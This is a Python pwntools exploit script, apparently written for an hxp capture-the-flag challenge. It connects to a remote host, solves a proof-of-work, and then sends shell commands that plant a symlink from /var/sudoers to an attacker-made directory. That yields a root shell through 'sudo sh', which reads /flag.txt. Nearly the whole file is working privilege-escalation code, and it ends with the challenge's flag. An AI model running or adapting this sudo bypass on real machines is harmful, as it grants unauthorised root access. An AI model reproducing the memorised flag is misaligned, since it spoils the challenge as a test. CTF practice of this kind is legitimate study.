# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
exp: sudo bypass to read /flag.txt
'''
from pwn import *


# define the context
# binary_name = './challenge'
# libc_name = './libc.so.6' if args.REMOTE \
#         else ''
# elf = ELF(binary_name, checksec=True) if binary_name else None
# libc = ELF(libc_name, checksec=False) if libc_name else None
# context.binary = elf
# context(arch=elf.arch, os=elf.os)
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
def connect():
    if args.LOCAL:
        return remote("127.0.0.1", 10218)
    tube = remote("5.75.189.36", 31339)
    tube.recvuntil(b'please give S such that sha256(unhex("')
    challenge = tube.recvuntil(b'"', drop=True)
    tube.recvuntil(b" ends with ")
    bits = int(tube.recvuntil(b" ", drop=True))
    print('execution: ./pow-solver', str(bits), challenge.decode())
    response = subprocess.check_output(["./pow-solver", str(bits), challenge.decode()])
    tube.send(response)
    return tube


# exploiting code
io = connect()
ru(b'\x5b\x31\x37\x47')

# sudo bypass
sl(b'mkdir /tmp/foo')
sleep(0.1)
sl(b'touch /tmp/foo/1000')
sleep(0.1)
sl(b'ln -s /tmp/foo /var/sudoers')
sleep(0.1)
sl(b'sudo sh')
sleep(0.1)
sl(b'cat /flag.txt')

# hxp{Please_be_so_kind_to_report_your_findings_on_GitHub_kthxbye_hxp________after_the_ctf}
io.close()
